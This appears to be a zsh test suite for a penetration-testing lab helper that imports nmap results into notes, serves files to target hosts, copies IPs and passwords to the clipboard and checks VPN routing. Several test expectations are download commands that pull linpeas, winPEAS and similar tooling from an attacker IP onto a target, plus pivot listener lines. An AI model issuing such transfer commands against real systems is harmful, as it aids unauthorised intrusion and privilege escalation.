# nmap import (dz -p), dz serve, dz -cp and the VPN check. Nothing here touches the network.

cp $_dz_repo/templates/box-note.md ~/vault/Templates/Box-note.md
dz -n corp -ip 10.10.10.10 >/dev/null
dz -t dc01 -ip 10.10.10.5 >/dev/null
N=~/vault/Boxes/corp.md S=~/boxes/corp/scans

# --- dz -p
print -r -- '<?xml version="1.0"?><nmaprun>
<host><address addr="10.10.10.10" addrtype="ipv4"/><ports>
<port protocol="tcp" portid="22"><state state="open"/><service name="ssh" product="OpenSSH" version="8.2p1" extrainfo="Ubuntu"/></port>
<port protocol="tcp" portid="80"><state state="open"/><service name="http" product="Apache httpd" version="2.4.41"/></port>
<port protocol="tcp" portid="443"><state state="closed"/><service name="https"/></port>
</ports></host>
<host><address addr="10.10.10.5" addrtype="ipv4"/><ports>
<port protocol="tcp" portid="445"><state state="open"/><service name="microsoft-ds"/></port>
</ports></host>
<host><address addr="10.10.10.99" addrtype="ipv4"/><ports>
<port protocol="tcp" portid="21"><state state="open"/><service name="ftp"/></port>
</ports></host></nmaprun>' > $S/all.xml
eq  "parse xml: open ports only" 4 "$(_dz_nmap_parse $S/all.xml | wc -l | tr -d ' ')"
has "parse xml: version with extrainfo" $'22\ttcp\tssh\tOpenSSH 8.2p1 (Ubuntu)' "$(_dz_nmap_parse $S/all.xml)"
out=$(dz -p 2>&1)
has "-p without a file takes the newest in scans/" "22/tcp" "$out"
has "-p: unknown IP skipped and reported" "skipped: 10.10.10.99" "$out"
has "-p: rows in the note, with the host (the box has more than one)" "| 22/tcp | ssh | OpenSSH 8.2p1 (Ubuntu) | corp |" "$(cat $N)"
has "-p: extra host goes in the notes column" "| 445/tcp | microsoft-ds | | dc01 |" "$(cat $N)"
nok "-p: closed port not added" grep -q '443' $N
nok "-p: empty example row gone" grep -qx '| | | | |' <<< "$(sed -n '/^## Ports/,/^## /p' $N)"
has "-p: timeline line" "· nmap: 3 open ports on corp, dc01 (all.xml)" "$(cat $N)"
perl -pi -e 's/^(\| 22\/tcp \|.*\| )corp \|/$1corp creds reused |/' $N
perl -pi -e 's/^(\| 80\/tcp \|.*\| )corp \|/$1my own note |/' $N
has "-p again: nothing new" "already has all 3" "$(dz -p $S/all.xml 2>/dev/null)"
has "-p again: your notes stay" "| 22/tcp | ssh | OpenSSH 8.2p1 (Ubuntu) | corp creds reused |" "$(cat $N)"
eq  "-p again: an edited row (host name gone) never gets a twin" 1 "$(grep -c '| 80/tcp |' $N)"
eq  "-p again: no duplicate rows" 1 "$(grep -c '| 22/tcp |' $N)"

# gnmap, and a table with Poort / Proto / State / Versie / Opmerking columns
print -r -- $'---\nupdated: x\n---\n### Poorten & services\n\n| Poort | Proto | State | Service | Versie | Opmerking |\n|---|---|---|---|---|---|\n| | TCP | open | | | |\n\n## Next' > ~/vault/Templates/Box-note.md
dz -n lab -ip 10.10.40.1 >/dev/null
print -r -- $'# Nmap\nHost: 10.10.40.1 ()\tStatus: Up\nHost: 10.10.40.1 ()\tPorts: 53/open/udp//domain//dnsmasq 2.80/, 8080/open/tcp//http-proxy///, 9/filtered/tcp//discard///' > ~/boxes/lab/scans/udp.gnmap
dz -p >/dev/null 2>&1
L=~/vault/Boxes/lab.md
has "gnmap: udp port with its own proto column" "| 53 | UDP | open | domain | dnsmasq 2.80 | |" "$(cat $L)"
has "gnmap: tcp port" "| 8080 | TCP | open | http-proxy | | |" "$(cat $L)"
nok "gnmap: filtered skipped" grep -q '| 9 |' $L
nok "gnmap: example row with only TCP/open gone" grep -qx '| | TCP | open | | | |' $L
nok "-p with a missing file fails" dz -p /nope.xml
dz -l corp >/dev/null

# --- dz serve (no real server: python3 and impacket are stubbed)
_dz_attacker_ip() { print 10.10.14.7 }
python3() { print "STARTED python3 $*" }
mkdir -p ~/tools; print x > ~/tools/linpeas.sh; print x > ~/tools/winPEAS.exe
out=$(dz serve ~/tools 8000)
has "serve: URL with port" "http://10.10.14.7:8000" "$out"
has "serve: linux download command" "wget http://10.10.14.7:8000/linpeas.sh -O /tmp/linpeas.sh" "$out"
has "serve: windows download command" "iwr http://10.10.14.7:8000/winPEAS.exe -OutFile" "$out"
has "serve: only on the VPN IP, on the port, in the folder" "STARTED python3 -m http.server 8000 --bind 10.10.14.7 --directory ${HOME:A}/tools" "$out"
has "serve: port 80 has no :80" "http://10.10.14.7/linpeas.sh" "$(dz serve ~/tools)"
nok "serve: missing folder fails" dz serve ~/nope
mkdir -p ~/boxes/corp/exploits; print x > ~/boxes/corp/exploits/shell.elf
has "serve: a box subfolder by name" "shell.elf" "$(dz serve exploits)"
nok "serve: refuses the box folder (creds, .dropzone, notes)" dz serve ~/boxes/corp
has "and says why" "holds your box files" "$(dz serve ~/boxes/corp 2>&1)"
nok "serve: refuses your home folder" dz serve ~
nok "serve: refuses the boxes folder (every box)" dz serve ~/boxes
mkdir -p ~/boxes/_archive
nok "serve: refuses the archive" dz serve ~/boxes/_archive
DZ_ROOT=~/work/boxes; mkdir -p ~/work/boxes
nok "serve: refuses a folder above the boxes folder" dz serve ~/work
nok "serve: refuses /" dz serve /
DZ_ROOT=~/'w[1]'/boxes; mkdir -p $DZ_ROOT ~/w1
nok "serve: boxes folder under a path with [ ]" dz serve ~/'w[1]'
DZ_ROOT=~/boxes
DZ_ROOT=~/boxes
mkdir -p ~/boxes/corp/loot; print 'S3cret!' > ~/boxes/corp/loot/passwords.txt
has "serve: warns for exported creds lists" "W604" "$(dz serve loot 2>&1)"
has "and still serves" "STARTED python3" "$(dz serve loot 2>/dev/null)"
rm -rf ~/boxes/corp/loot/passwords.txt
impacket-smbserver() { print "STARTED smb $*" }
commands[impacket-smbserver]=impacket-smbserver
out=$(dz serve smb ~/tools)
has "serve smb: copy command" 'copy \\10.10.14.7\share\linpeas.sh .' "$out"
has "serve smb: only on the VPN IP" "STARTED smb -smb2support -ip 10.10.14.7 -port 445 share ${HOME:A}/tools" "$out"
# Through a pivot: the ligolo listener, and URLs with the pivot's IP.
dz -t web01 -ip 172.16.5.15 >/dev/null
out=$(dz serve ~/tools --via web01)
has "serve --via: ligolo listener to the VPN IP" "listener_add --addr 0.0.0.0:8000 --to 10.10.14.7:8000 --tcp" "$out"
has "serve --via: download from the pivot's IP" "wget http://172.16.5.15:8000/linpeas.sh" "$out"
has "serve --via: still only on the VPN IP" "STARTED python3 -m http.server 8000 --bind 10.10.14.7" "$out"
has "serve --via an IP, with a port" "listener_add --addr 0.0.0.0:9001 --to 10.10.14.7:9001" "$(dz serve ~/tools 9001 --via 172.16.5.20)"
has "serve --via port below 1024: needs root on the pivot" "needs root" "$(dz serve ~/tools 80 --via web01)"
nok "serve --via an unknown host fails" dz serve ~/tools --via nope
nok "serve smb --via fails" dz serve smb ~/tools --via web01
has "and says to use HTTP" "use HTTP" "$(dz serve smb ~/tools --via web01 2>&1)"
dz -t web01 --drop >/dev/null

_dz_attacker_ip() { : }
has "serve without VPN says why" "is down" "$(dz serve ~/tools 2>&1)"
_dz_attacker_ip() { print 10.10.14.7 }

# --- dz -cp (no clipboard here, so it prints the value)
DISPLAY= WAYLAND_DISPLAY=
eq  "-cp: target" 10.10.10.10 "$(dz -cp)"
eq  "-cp dc01" 10.10.10.5 "$(dz -cp dc01)"
eq  "-cp corp (main host)" 10.10.10.10 "$(dz -cp corp)"
eq  "-cp me" 10.10.14.7 "$(dz -cp me)"
eq  "-cp targets" "10.10.10.10 10.10.10.5" "$(dz -cp targets)"
nok "-cp unknown fails" dz -cp nope
nok "-cp user without a cred fails" dz -cp user
DZ_CREDS=yes; dz -c 'alex:S3cret!' >/dev/null
eq  "-cp pass" 'S3cret!' "$(dz -cp pass)"
DISPLAY=:0; xclip() { cat > ~/clip }; commands[xclip]=xclip
out=$(dz -cp pass)
eq  "-cp to the clipboard" 'S3cret!' "$(cat ~/clip)"
has "-cp: a secret isn't printed" "copied the password of alex" "$out"
nok "-cp: and not shown" grep -q 'S3cret' <<< "$out"
has "-cp: a normal value is shown" "copied the IP of dc01: 10.10.10.5" "$(dz -cp dc01)"

# --- VPN check (ip is stubbed; the other tests run with vpncheck = no)
DZ_VPNCHECK=yes
ip() {
  case "$*" in
    "link show tun0") return 0 ;;
    "route get 10.10.10.10") print "10.10.10.10 via 10.10.14.1 dev tun0 src 10.10.14.7" ;;
    "route get 10.10.10.77") print "10.10.10.77 via 192.168.1.1 dev eth0 src 192.168.1.5" ;;
    "route get 172.16.5.10") print "172.16.5.10 dev ligolo src 10.10.14.7" ;;
  esac
}
commands[ip]=ip
eq  "vpn check: routed through tun0, no warning" "" "$(_dz_vpn_check 10.10.10.10 2>&1)"
has "vpn check: other route warns" "goes through eth0, not tun0" "$(_dz_vpn_check 10.10.10.77 2>&1)"
eq  "vpn check: route through a pivot (ligolo) is fine" "" "$(_dz_vpn_check 172.16.5.10 2>&1)"
eq  "vpn check: dz -t on a host behind the pivot, no warning" "" "$(dz -t ms01 -ip 172.16.5.10 2>&1 >/dev/null)"
DZ_PIVOT=()
has "vpn check: pivot = none warns again" "goes through ligolo, not tun0" "$(_dz_vpn_check 172.16.5.10 2>&1)"
DZ_PIVOT=('lig*' 'tun9')
eq  "vpn check: own pivot patterns" "" "$(_dz_vpn_check 172.16.5.10 2>&1)"
ip() { return 1 }
has "vpn check: interface missing warns" "tun0 doesn't exist" "$(_dz_vpn_check 10.10.10.10 2>&1)"
DZ_VPNCHECK=no
eq  "vpncheck = no: silent" "" "$(_dz_vpn_check 10.10.10.77 2>&1)"
